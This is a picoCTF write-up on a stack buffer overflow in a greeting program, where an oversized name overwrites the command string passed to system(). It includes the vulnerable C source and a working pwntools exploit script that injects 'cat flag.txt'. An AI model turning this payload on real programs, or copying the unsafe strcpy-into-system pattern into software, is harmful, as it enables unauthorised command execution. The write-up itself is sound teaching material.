# Input Injection 1 - Writeup

**Category:** Binary Exploitation\
**Difficulty:** Medium\
**Platform:** picoCTF

------------------------------------------------------------------------

## Challenge Description

A friendly program wants to greet you... but its goodbye might say more
than it should.\
Can you convince it to reveal the flag?

------------------------------------------------------------------------

## Step 1 -- Launching the Instance

After launching the challenge instance, we are provided with:

-   The compiled binary (`vuln`)
-   The source code
-   A remote service accessible via:

nc amiable-citadel.picoctf.net `<port>`{=html}

------------------------------------------------------------------------

## Step 2 -- Initial Binary Analysis

First, make the binary executable:

chmod +x vuln

Then inspect it:

file vuln

Output:

ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

Important observation:

-   The binary is **not stripped**, meaning it still contains debugging
    symbols.
-   This can be useful during deeper analysis.

------------------------------------------------------------------------

## Step 3 -- Runtime Behavior

Running the binary shows:

What is your name?

If we input:

josh

The output is:

Goodbye, josh!\
Linux

The program prints the system information using `uname`.

------------------------------------------------------------------------

## Step 4 -- Source Code Review

Vulnerable function:

void fun(char *name, char *cmd) { char c\[10\]; char buffer\[10\];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);

}

### Vulnerability Analysis

The issue lies in the use of:

strcpy()

-   `buffer` is only **10 bytes**
-   `c` is only **10 bytes**
-   `strcpy()` performs **no bounds checking**

User input (up to 200 bytes) is copied into `buffer` (10 bytes).

If the input exceeds 10 bytes:

1.  `buffer` overflows\
2.  Adjacent memory (`c`) is overwritten\
3.  `system(c)` executes whatever is now inside `c`

This results in a **stack-based buffer overflow leading to command
injection**.

------------------------------------------------------------------------

## Step 5 -- Exploit Strategy

We must:

1.  Fill the 10-byte `buffer`
2.  Overwrite `c`
3.  Replace `"uname"` with `"cat flag.txt"`
4.  Ensure proper null termination

Payload structure:

\[10 bytes padding\]\[cat flag.txt\]

------------------------------------------------------------------------

## Step 6 -- Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

def exploit():
    # Target connection
    HOST = "amiable-citadel.picoctf.net"
    PORT = 62361
    
    print(f"[*] Connecting to target...")
    p = remote(HOST, PORT)
    
    # Receive initial prompt
    p.recvuntil(b"name?")
    p.recvline()
    
    # Craft payload: 10 bytes to fill buffer + command injection
    BUFFER_SIZE = 10
    padding = b"A" * BUFFER_SIZE
    command = b"cat flag.txt\n"
    payload = padding + command
    
    print(f"[*] Sending exploit payload ({len(payload)} bytes)")
    p.sendline(payload)
    
    # Extract flag
    p.recvline()  # Consume "Goodbye, AAAAAAAAAA!" message
    flag = p.recvline().decode().strip()
    
    print(f"[+] Success! Flag: {flag}")
    p.close()
    
    return flag

if __name__ == "__main__":
    exploit()
```

------------------------------------------------------------------------

## Step 7 -- Result

Successful execution returns:

picoCTF{0v3rfl0w_c0mm4nd_redacted}

------------------------------------------------------------------------

## Key Takeaways

-   Never use `strcpy()` without bounds checking\
-   Always validate input sizes\
-   Stack-based overflows can lead to command execution\
-   Small buffer mistakes can completely compromise a program

------------------------------------------------------------------------

## Final Thoughts

This challenge demonstrates how improper memory handling in C can lead
to full command injection.\
A seemingly harmless greeting program becomes vulnerable due to unsafe
string copying.

Binary exploitation often begins with simple mistakes like this.
